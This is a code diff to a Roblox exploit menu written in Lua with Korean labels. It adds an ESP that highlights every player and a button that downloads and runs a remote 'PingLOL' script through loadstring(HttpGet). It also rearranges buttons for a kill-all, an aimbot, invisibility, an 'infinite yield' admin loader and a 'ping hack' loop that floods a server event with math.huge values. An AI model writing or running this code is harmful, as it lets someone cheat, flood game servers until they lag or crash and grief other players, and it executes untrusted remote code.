@@ -42,7 +42,7 @@ Rayfield:Notify({
 })
 
 local MainTab = Window:CreateTab("🌍메인 탭🌍", 4483362458) -- Title, Image
-local MainSection = MainTab:CreateSection("메인")
+local MainSection = MainTab:CreateSection("Speed Jump Power")
 
 local Slider = MainTab:CreateSlider({
    Name = "걷기 스피드 ",
@@ -67,6 +67,8 @@ local Slider = MainTab:CreateSlider({
     game.Players.LocalPlayer.Character.Humanoid.JumpPower = (Value)
    end,
 })
+
+local MainSection = MainTab:CreateSection("Explosion")
 
 local Button = MainTab:CreateButton({
    Name = "서버폭발",
@@ -130,11 +132,64 @@ end
 
 
 local Button = MainTab:CreateButton({
+   Name = "ESP",
+   Callback = function()
+    local Players = game:GetService("Players"):GetChildren()
+local RunService = game:GetService("RunService")
+local highlight = Instance.new("Highlight")
+highlight.Name = "Highlight"
+
+for i, v in pairs(Players) do
+    repeat wait() until v.Character
+    if not v.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Highlight") then
+        local highlightClone = highlight:Clone()
+        highlightClone.Adornee = v.Character
+        highlightClone.Parent = v.Character:FindFirstChild("HumanoidRootPart")
+        highlightClone.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+        highlightClone.Name = "Highlight"
+    end
+end
+
+game.Players.PlayerAdded:Connect(function(player)
+    repeat wait() until player.Character
+    if not player.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Highlight") then
+        local highlightClone = highlight:Clone()
+        highlightClone.Adornee = player.Character
+        highlightClone.Parent = player.Character:FindFirstChild("HumanoidRootPart")
+        highlightClone.Name = "Highlight"
+    end
+end)
+
+game.Players.PlayerRemoving:Connect(function(playerRemoved)
+    playerRemoved.Character:FindFirstChild("HumanoidRootPart").Highlight:Destroy()
+end)
+
+RunService.Heartbeat:Connect(function()
+    for i, v in pairs(Players) do
+        repeat wait() until v.Character
+        if not v.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Highlight") then
+            local highlightClone = highlight:Clone()
+            highlightClone.Adornee = v.Character
+            highlightClone.Parent = v.Character:FindFirstChild("HumanoidRootPart")
+            highlightClone.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+            highlightClone.Name = "Highlight"
+            task.wait()
+        end
+end
+end)
+   end,
+})
+
+local MainSection = MainTab:CreateSection("Infinid Yard")
+
+local Button = MainTab:CreateButton({
    Name = "어드민 스크립트 ",
    Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    end,
 })
+
+local MainSection = MainTab:CreateSection("------------------------------")
 
 local Button = MainTab:CreateButton({
    Name = "사람 날리기",
@@ -241,10 +296,10 @@ end
 
 
 local Button = MainTab:CreateButton({
-   Name = "투명 (L) ",
+   Name = "투명 (H) ",
    Callback = function()
     local ScriptStarted = false
-local Keybind = "L" --Set to whatever you want, has to be the name of a KeyCode Enum.
+local Keybind = "H" --Set to whatever you want, has to be the name of a KeyCode Enum.
 local Transparency = true --Will make you slightly transparent when you are invisible. No reason to disable.
 local NoClip = false --Will make your fake character no clip.
  
@@ -449,6 +504,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/JinxTheCatto/Neptune/
 local Tab = Window:CreateTab("부대 테러 스크립트 ", 4483362458) -- Title, Image
 local Section = Tab:CreateSection("부대 테러 ")
 
+local Section = Tab:CreateSection("킬올 ")
 
 local Button = Tab:CreateButton({
    Name = "acs 2.0.1 킬올 ",
@@ -475,12 +531,16 @@ for PlayerIndex,GivenPlayer in pairs(game.Players:GetPlayers()) do
    end,
 })
 
+local Section = Tab:CreateSection("핑핵 ")
+
 local Button = Tab:CreateButton({
    Name = "핑핵 실행",
    Callback = function()
 while true do for i = 1 , 2500 do game.ReplicatedStorage.ACS_Engine.Events.ServerBullet:FireServer(Vector3.new(math.huge , math.huge , math.huge)) end task.wait() end
         end,
 })
+
+local Section = Tab:CreateSection("CE 엔진 폭발 ")
 
 local Button = Tab:CreateButton({
    Name = "CE 엔진 폭발 ",
@@ -497,158 +557,6 @@ import "CarbonExploit"
 local LocalPlayer = Players.LocalPlayer
 
 CarbonExploit:Explode(LocalPlayer.Character.Torso.Position)
-   end,
-})
-
-
-local Button = Tab:CreateButton({
-   Name = "투명 (L) ",
-   Callback = function()
-    local ScriptStarted = false
-local Keybind = "L" --Set to whatever you want, has to be the name of a KeyCode Enum.
-local Transparency = true --Will make you slightly transparent when you are invisible. No reason to disable.
-local NoClip = false --Will make your fake character no clip.
- 
-local Player = game:GetService("Players").LocalPlayer
-local RealCharacter = Player.Character or Player.CharacterAdded:Wait()
- 
-local IsInvisible = false
- 
-RealCharacter.Archivable = true
-local FakeCharacter = RealCharacter:Clone()
-local Part
-Part = Instance.new("Part", workspace)
-Part.Anchored = true
-Part.Size = Vector3.new(200, 1, 200)
-Part.CFrame = CFrame.new(0, -500, 0) --Set this to whatever you want, just far away from the map.
-Part.CanCollide = true
-FakeCharacter.Parent = workspace
-FakeCharacter.HumanoidRootPart.CFrame = Part.CFrame * CFrame.new(0, 5, 0)
- 
-for i, v in pairs(RealCharacter:GetChildren()) do
-  if v:IsA("LocalScript") then
-      local clone = v:Clone()
-      clone.Disabled = true
-      clone.Parent = FakeCharacter
-  end
-end
-if Transparency then
-  for i, v in pairs(FakeCharacter:GetDescendants()) do
-      if v:IsA("BasePart") then
-          v.Transparency = 0.7
-      end
-  end
-end
-local CanInvis = true
-function RealCharacterDied()
-  CanInvis = false
-  RealCharacter:Destroy()
-  RealCharacter = Player.Character
-  CanInvis = true
-  isinvisible = false
-  FakeCharacter:Destroy()
-  workspace.CurrentCamera.CameraSubject = RealCharacter.Humanoid
- 
-  RealCharacter.Archivable = true
-  FakeCharacter = RealCharacter:Clone()
-  Part:Destroy()
-  Part = Instance.new("Part", workspace)
-  Part.Anchored = true
-  Part.Size = Vector3.new(200, 1, 200)
-  Part.CFrame = CFrame.new(9999, 9999, 9999) --Set this to whatever you want, just far away from the map.
-  Part.CanCollide = true
-  FakeCharacter.Parent = workspace
-  FakeCharacter.HumanoidRootPart.CFrame = Part.CFrame * CFrame.new(0, 5, 0)
- 
-  for i, v in pairs(RealCharacter:GetChildren()) do
-      if v:IsA("LocalScript") then
-          local clone = v:Clone()
-          clone.Disabled = true
-          clone.Parent = FakeCharacter
-      end
-  end
-  if Transparency then
-      for i, v in pairs(FakeCharacter:GetDescendants()) do
-          if v:IsA("BasePart") then
-              v.Transparency = 0.7
-          end
-      end
-  end
- RealCharacter.Humanoid.Died:Connect(function()
- RealCharacter:Destroy()
- FakeCharacter:Destroy()
- end)
- Player.CharacterAppearanceLoaded:Connect(RealCharacterDied)
-end
-RealCharacter.Humanoid.Died:Connect(function()
- RealCharacter:Destroy()
- FakeCharacter:Destroy()
- end)
-Player.CharacterAppearanceLoaded:Connect(RealCharacterDied)
-local PseudoAnchor
-game:GetService "RunService".RenderStepped:Connect(
-  function()
-      if PseudoAnchor ~= nil then
-          PseudoAnchor.CFrame = Part.CFrame * CFrame.new(0, 5, 0)
-      end
-       if NoClip then
-      FakeCharacter.Humanoid:ChangeState(11)
-       end
-  end
-)
- 
-PseudoAnchor = FakeCharacter.HumanoidRootPart
-local function Invisible()
-  if IsInvisible == false then
-      local StoredCF = RealCharacter.HumanoidRootPart.CFrame
-      RealCharacter.HumanoidRootPart.CFrame = FakeCharacter.HumanoidRootPart.CFrame
-      FakeCharacter.HumanoidRootPart.CFrame = StoredCF
-      RealCharacter.Humanoid:UnequipTools()
-      Player.Character = FakeCharacter
-      workspace.CurrentCamera.CameraSubject = FakeCharacter.Humanoid
-      PseudoAnchor = RealCharacter.HumanoidRootPart
-      for i, v in pairs(FakeCharacter:GetChildren()) do
-          if v:IsA("LocalScript") then
-              v.Disabled = false
-          end
-      end
- 
-      IsInvisible = true
-  else
-      local StoredCF = FakeCharacter.HumanoidRootPart.CFrame
-      FakeCharacter.HumanoidRootPart.CFrame = RealCharacter.HumanoidRootPart.CFrame
- 
-      RealCharacter.HumanoidRootPart.CFrame = StoredCF
- 
-      FakeCharacter.Humanoid:UnequipTools()
-      Player.Character = RealCharacter
-      workspace.CurrentCamera.CameraSubject = RealCharacter.Humanoid
-      PseudoAnchor = FakeCharacter.HumanoidRootPart
-      for i, v in pairs(FakeCharacter:GetChildren()) do
-          if v:IsA("LocalScript") then
-              v.Disabled = true
-          end
-      end
-      IsInvisible = false
-  end
-end
- 
-game:GetService("UserInputService").InputBegan:Connect(
-  function(key, gamep)
-      if gamep then
-          return
-      end
-      if key.KeyCode.Name:lower() == Keybind:lower() and CanInvis and RealCharacter and FakeCharacter then
-          if RealCharacter:FindFirstChild("HumanoidRootPart") and FakeCharacter:FindFirstChild("HumanoidRootPart") then
-              Invisible()
-          end
-      end
-  end
-)
-local Sound = Instance.new("Sound",game:GetService("SoundService"))
-Sound.SoundId = "rbxassetid://232127604"
-Sound:Play()
-game:GetService("StarterGui"):SetCore("SendNotification",{["Title"] = "Invisible Toggle Loaded",["Text"] = "Press "..Keybind.." to become change visibility.",["Duration"] = 20,["Button1"] = "Okay."})
    end,
 })
 
@@ -1091,21 +999,6 @@ local args = {
 workspace:WaitForChild("Remote"):WaitForChild("ItemHandler"):InvokeServer(unpack(args)) 
 
 local Button = Tab:CreateButton({
-   Name = "간수되기",
-   Callback = function()
--- Script generated by SimpleSpy - credits to exx#9394
-
-local args = {
-    [1] = "Bright blue"
-}
-
-workspace.Remote.TeamEvent:FireServer(unpack(args))
-   end,
-})
-   end,
-})
-
-local Button = Tab:CreateButton({
    Name = "오토에임 (킬아우라) ",
    Callback = function()
 mainRemotes = game.ReplicatedStorage
@@ -1219,54 +1112,6 @@ local Slider = Tab:CreateSlider({
 local Tab = Window:CreateTab("분류되지 않는 스크립트", 4483362458) -- Title, Image
 local Section = Tab:CreateSection("스크립트들")
 
-local Button = Tab:CreateButton({
-   Name = "ESP",
-   Callback = function()
-    local Players = game:GetService("Players"):GetChildren()
-local RunService = game:GetService("RunService")
-local highlight = Instance.new("Highlight")
-highlight.Name = "Highlight"
-
-for i, v in pairs(Players) do
-    repeat wait() until v.Character
-    if not v.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Highlight") then
-        local highlightClone = highlight:Clone()
-        highlightClone.Adornee = v.Character
-        highlightClone.Parent = v.Character:FindFirstChild("HumanoidRootPart")
-        highlightClone.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-        highlightClone.Name = "Highlight"
-    end
-end
-
-game.Players.PlayerAdded:Connect(function(player)
-    repeat wait() until player.Character
-    if not player.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Highlight") then
-        local highlightClone = highlight:Clone()
-        highlightClone.Adornee = player.Character
-        highlightClone.Parent = player.Character:FindFirstChild("HumanoidRootPart")
-        highlightClone.Name = "Highlight"
-    end
-end)
-
-game.Players.PlayerRemoving:Connect(function(playerRemoved)
-    playerRemoved.Character:FindFirstChild("HumanoidRootPart").Highlight:Destroy()
-end)
-
-RunService.Heartbeat:Connect(function()
-    for i, v in pairs(Players) do
-        repeat wait() until v.Character
-        if not v.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Highlight") then
-            local highlightClone = highlight:Clone()
-            highlightClone.Adornee = v.Character
-            highlightClone.Parent = v.Character:FindFirstChild("HumanoidRootPart")
-            highlightClone.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-            highlightClone.Name = "Highlight"
-            task.wait()
-        end
-end
-end)
-   end,
-})
 
 local Button = Tab:CreateButton({
    Name = "중력 바꾸기 (e)",
@@ -1275,3 +1120,12 @@ local Button = Tab:CreateButton({
    end,
 })
 
+local Tab = Window:CreateTab("완성 재단", 4483362458) -- Title, Image
+local MSection = Tab:CreateSection("핑핵")
+
+local Button = Tab:CreateButton({
+   Name = "완성 재단 핑핵 실행!",
+   Callback = function()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/0xlua10/XTerror/refs/heads/main/PingLOL')))()
+   end,
+})
